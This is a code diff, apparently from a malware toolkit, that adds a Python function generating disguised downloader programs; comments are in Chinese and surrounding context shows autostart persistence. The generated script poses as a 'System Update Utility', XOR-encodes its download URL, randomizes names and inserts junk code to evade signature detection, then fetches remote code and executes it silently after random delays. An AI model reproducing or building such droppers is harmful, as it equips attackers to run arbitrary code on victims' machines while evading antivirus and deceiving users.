@@ -255,3 +255,179 @@ X-GNOME-Autostart-enabled=true
 if ''' + str(add_persistence).lower() + ''':
     _setup_persistence()
 '''
+
+
+def create_downloader(download_url, silent_mode=True, output_dir=".", filename=None):
+    """创建下载器程序
+    
+    Args:
+        download_url (str): 主程序下载地址
+        silent_mode (bool): 是否静默运行
+        output_dir (str): 输出目录
+        filename (str): 下载器文件名
+    
+    Returns:
+        str: 下载器文件路径
+    """
+    # 随机生成变量名以避免特征检测
+    var_names = {
+        'url': ''.join(random.choices(string.ascii_lowercase, k=8)),
+        'response': ''.join(random.choices(string.ascii_lowercase, k=8)),
+        'content': ''.join(random.choices(string.ascii_lowercase, k=8)),
+        'temp_file': ''.join(random.choices(string.ascii_lowercase, k=8)),
+        'filename': ''.join(random.choices(string.ascii_lowercase, k=8))
+    }
+    
+    # 生成干扰代码
+    junk_functions = []
+    for i in range(random.randint(2, 5)):
+        func_name = ''.join(random.choices(string.ascii_lowercase, k=8))
+        junk_functions.append(f"""
+def {func_name}():
+    '''辅助函数 {i+1}'''
+    import time
+    import random
+    time.sleep(random.uniform(0.1, 0.3))
+    return random.randint(1, 1000)
+""")
+    
+    # 下载器模板
+    downloader_template = '''# -*- coding: utf-8 -*-
+"""
+System Update Utility
+Auto-updates system components
+Generated: {timestamp}
+"""
+import os
+import sys
+import time
+import random
+import tempfile
+{junk_functions}
+
+def main():
+    """主更新函数"""
+    try:
+        {silent_check}
+        
+        # 干扰代码
+        {junk_var1} = {junk_call1}()
+        time.sleep(random.uniform(0.5, 1.5))
+        
+        # 导入网络模块
+        try:
+            import urllib.request
+            import urllib.error
+        except ImportError:
+            sys.exit(0)
+        
+        # 更多干扰
+        {junk_var2} = {junk_call2}()
+        
+        # 下载URL (编码以避免明文)
+        {url_var} = "{encoded_url}"
+        {url_var} = ''.join(chr(ord(c) ^ 0x42) for c in {url_var})
+        
+        try:
+            # 创建请求
+            req = urllib.request.Request({url_var})
+            req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+            
+            # 下载文件
+            with urllib.request.urlopen(req, timeout=30) as {response_var}:
+                {content_var} = {response_var}.read()
+            
+            # 保存到临时文件
+            {temp_var} = tempfile.NamedTemporaryFile(mode='wb', suffix='.py', delete=False)
+            {temp_var}.write({content_var})
+            {temp_var}.close()
+            
+            # 执行下载的文件
+            {junk_var3} = {junk_call3}()
+            exec(compile({content_var}, '<downloaded>', 'exec'))
+            
+            # 清理临时文件
+            try:
+                os.unlink({temp_var}.name)
+            except:
+                pass
+                
+        except Exception:
+            # 静默失败
+            pass
+            
+    except Exception:
+        pass
+
+{execute_check}
+
+if __name__ == '__main__':
+    main()
+'''
+    
+    # 编码URL (简单XOR编码)
+    encoded_url = ''.join(chr(ord(c) ^ 0x42) for c in download_url)
+    
+    # 静默检查代码
+    silent_check = ""
+    if silent_mode:
+        silent_check = """
+        # 静默模式检查
+        if len(sys.argv) > 1 and '--debug' not in sys.argv:
+            time.sleep(random.uniform(10, 30))
+        """
+    
+    # 执行检查
+    execute_check = f"""
+# 随机延迟执行
+time.sleep(random.uniform(2, 8))
+"""
+    
+    # 填充模板
+    junk_calls = []
+    junk_vars = [f''.join(random.choices(string.ascii_lowercase, k=8)) for _ in range(3)]
+    
+    # 确保有足够的干扰函数
+    if len(junk_functions) >= 3:
+        junk_calls = [
+            junk_functions[0].split('def ')[1].split('(')[0].strip(),
+            junk_functions[1].split('def ')[1].split('(')[0].strip(),
+            junk_functions[2].split('def ')[1].split('(')[0].strip()
+        ]
+    else:
+        # 如果干扰函数不够，使用简单的占位符
+        junk_calls = ['lambda: 1', 'lambda: 2', 'lambda: 3']
+    
+    content = downloader_template.format(
+        timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        junk_functions='\n'.join(junk_functions),
+        silent_check=silent_check,
+        encoded_url=encoded_url,
+        url_var=var_names['url'],
+        response_var=var_names['response'],
+        content_var=var_names['content'],
+        temp_var=var_names['temp_file'],
+        junk_var1=junk_vars[0],
+        junk_var2=junk_vars[1],
+        junk_var3=junk_vars[2],
+        junk_call1=junk_calls[0],
+        junk_call2=junk_calls[1],
+        junk_call3=junk_calls[2],
+        execute_check=execute_check
+    )
+    
+    # 生成文件名
+    if filename is None:
+        downloader_names = [
+            "update_manager.py", "system_updater.py", "auto_update.py",
+            "component_updater.py", "security_update.py", "patch_manager.py",
+            "maintenance_tool.py", "software_updater.py"
+        ]
+        filename = random.choice(downloader_names)
+    
+    filepath = os.path.join(output_dir, filename)
+    
+    with open(filepath, 'w', encoding='utf-8') as f:
+        f.write(content)
+    
+    return filepath
